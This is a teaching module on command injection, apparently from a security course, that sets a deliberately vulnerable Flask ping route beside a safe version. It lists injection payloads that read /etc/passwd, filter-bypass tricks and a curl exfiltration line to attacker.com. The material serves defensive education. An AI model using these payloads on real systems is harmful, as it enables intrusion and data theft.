Module 18 — Command Injection

Learn how unsanitized input passed to OS commands enables attackers to execute arbitrary system commands.

What Is Command Injection?

Command injection occurs when an application passes user-controlled data to a system shell (e.g., via os.popen(), os.system(), or subprocess.run(shell=True)). Attackers inject shell metacharacters to chain additional commands.

Shell Metacharacters

CharacterMeaningExample
;Command separatorping 8.8.8.8; cat /etc/passwd
|Pipe outputping 8.8.8.8 | cat /etc/passwd
&&AND (run if first succeeds)ping 8.8.8.8 && cat /etc/passwd
||OR (run if first fails)ping invalid || cat /etc/passwd
`cmd`Backtick substitutionping `cat /etc/passwd`
$(cmd)Dollar substitutionping $(cat /etc/passwd)
%0aURL-encoded newlineStarts new command on next line

Vulnerable Code

@app.route('/ping')
def ping():
    host = request.args.get('host')
    # DANGEROUS: user input directly in shell command
    output = os.popen(f'ping -c 1 {host}').read()
    return output

Safe Code

import subprocess, shlex

@app.route('/ping')
def ping():
    host = request.args.get('host')
    # SAFE: pass as list (no shell interpretation)
    result = subprocess.run(
        ['ping', '-c', '1', host],
        capture_output=True, text=True, timeout=5
    )
    return result.stdout

Filter Bypass Techniques

# Space bypass with $IFS (Internal Field Separator)
cat${IFS}/etc/passwd

# Space bypass with brace expansion
{cat,/etc/passwd}

# Concatenation bypass
c''at /etc/passwd
c\at /etc/passwd

# Encoding bypass (URL-encoded newline)
host=8.8.8.8%0acat%20/etc/passwd

Blind Command Injection

When output is not displayed, detect injection via:

  • Time-based: ; sleep 5 — response delayed by 5 seconds
  • Out-of-band: ; curl http://attacker.com/?data=$(cat /etc/passwd)
  • File write: ; cat /secret > /app/static/output.txt
Impact: Command injection gives attackers full OS-level access — they can read files, install backdoors, pivot to other systems, exfiltrate data, or wipe the server entirely.
